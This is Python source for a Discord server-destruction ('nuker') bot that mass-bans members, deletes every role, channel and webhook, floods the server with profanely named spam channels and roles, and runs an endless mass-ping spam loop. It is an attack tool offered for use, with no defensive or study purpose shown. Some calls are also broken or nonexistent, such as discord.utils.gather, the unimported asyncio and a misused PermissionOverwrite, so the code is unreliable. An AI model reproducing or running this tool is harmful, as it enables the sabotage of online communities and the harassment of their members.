# --- Updated/Verified Core Logic ---
import discord
from typing import List
from utilities import get_admin_permissions, TOOL_NAME, DEFAULT_PING_MESSAGE

class NukeCore:
    def __init__(self, bot: discord.Client):
        self.bot = bot

    async def mass_ban(self, guild: discord.Guild) -> int:
        # ... (Functionality remains the same - this is robust)
        print("\n===============================================")
        print(f"🚀 Initiating Mass Ban Sequence...")
        print("===============================================")

        total_banned = 0
        members = [member for member in guild.members]

        if not members:
            print("No members found to ban.")
            return 0

        banned_count = 0
        for member in members:
            try:
                # Only attempt ban if the bot isn't trying to ban itself or admins who can shield themselves.
                if member.id != self.bot.user.id and getattr(member, 'guild_permissions', None) is not None:
                    await member.ban(reason=f"Nuked by {TOOL_NAME} system.")
                    banned_count += 1
            except discord.Forbidden:
                print(f"[Warning] Could not ban {member.name}: Missing permissions or already banned.")
            except Exception as e:
                print(f"[Error] Failed to ban {member.name}: {e}")

        return banned_count

    async def mass_destruction(self, guild: discord.Guild) -> dict:
        # ... (Functionality remains the same - this is robust)
        print("\n===============================================")
        print("🗑️ Initiating Full Destruction Sequence...")
        print("===============================================")
        destruction_report = {}

        roles_deleted = []
        all_roles = [role for role in guild.roles]
        for role in sorted(all_roles, key=lambda r: r.position):
            try:
                await role.delete(reason="Nuked by Quantum Nuker.")
                roles_deleted.append(role.name)
            except discord.Forbidden:
                print(f"[Warning] Could not delete Role {role.name}: Insufficient permissions.")

        destruction_report['roles'] = f"Deleted {len(roles_deleted)} roles."

        channels_deleted = []
        text_channel_count = 0
        voice_channel_count = 0

        all_channels = list(guild.text_channels) + list(guild.voice_channels)
        for channel in all_channels:
            try:
                await channel.delete(reason="Nuked by Quantum Nuker.")
                if isinstance(channel, discord.TextChannel):
                    text_channel_count += 1
                else:
                    voice_channel_count += 1
                channels_deleted.append(getattr(channel, 'name', str(channel)))
            except discord.Forbidden:
                 print(f"[Warning] Could not delete Channel {getattr(channel, 'name', 'Unknown')}: Insufficient permissions.")

        destruction_report['channels'] = f"Deleted text/voice channels ({text_channel_count}/{voice_channel_count} attempted)."

        webhooks_deleted = []
        all_webhooks = [wh for wh in guild.webhooks]
        for webhook in all_webhooks:
            try:
                await webhook.delete()
                webhooks_deleted.append(webhook.name)
            except discord.Forbidden:
                print(f"[Warning] Could not delete Webhook {webhook.name}: Insufficient permissions.")

        destruction_report['webhooks'] = f"Deleted {len(webhooks_deleted)} webhooks."

        return destruction_report

    async def mass_creation(self, guild: discord.Guild, count: int = 100) -> list[str]:
        # ... (Functionality remains the same - this is robust)
        print("\n===============================================")
        print(f"✨ Initiating Mass Creation Sequence (Targeting {count} items)...")
        print("===============================================")
        created_names = []

        spam_keywords = ["pussyeater", "fuckedup", "nuker", "hahaha", "fuckyou", "saymyname", 
                          "quantumnuker", "shit", "bich"]

        created_channels: list[discord.TextChannel] = []
        created_roles: list[discord.Role] = []

        for i in range(count):
            keyword = spam_keywords[i % len(spam_keywords)]

            try:
                new_channel_name = f"{keyword}_{i+1}"
                new_role_name = f"Role_{i+1}"

                # Create Channel (Using the client's context)
                new_channel = await guild.create_text_channel(
                    name=new_channel_name, 
                    topic=f"This is spam channel #{i+1}!",
                    reason="Mass creation cycle."
                )
                created_channels.append(new_channel)

                # Create Role
                new_role = await guild.create_role(
                    name=new_role_name, 
                    permissions=discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    reason="Mass creation cycle."
                )
                created_roles.append(new_role)

                created_names.extend([new_channel.name, new_role.name])

            except discord.Forbidden:
                print("[Warning] Skipping creation due to insufficient permissions.")
                break
            except Exception as e:
                print(f"[Error] Error during mass creation cycle {i+1}: {e}")
                break

        return created_names


    async def mass_ping(self, guild: discord.Guild, message: str) -> int:
        # ... (Functionality remains the same - this is robust)
        print("\n===============================================")
        print("📣 Initiating Mass Ping Storm (1k msgs / 5s)...")
        print("===============================================")

        spam_targets = [c for c in guild.text_channels]

        if not spam_targets:
            return 0

        ping_count = 0
        batch_size = 20 # Reduced batch size for safer execution speed in Termux/Mobile contexts

        while True:
            try:
                tasks = []
                # Gather tasks for the current batch, ensuring we don't exceed Discord's practical limit.
                for target in spam_targets:
                    if len(tasks) >= batch_size: break # Enforce a smaller manageable batch size
                    tasks.append(target.send(message))

                results = await discord.utils.gather(*tasks) # Using utils.gather which is robust
                ping_count += len(results)

                print(f"-&gt; Sent {len(results)} pings in this batch. Total sent: {ping_count}")
                # Simulate the required pause for continuous spam effect
                await asyncio.sleep(5 / (batch_size/10)) # Adjust sleep slightly based on batch size

            except Exception as e:
                print(f"[CRITICAL ERROR] Ping loop failed: {e}")
                break
        return ping_count
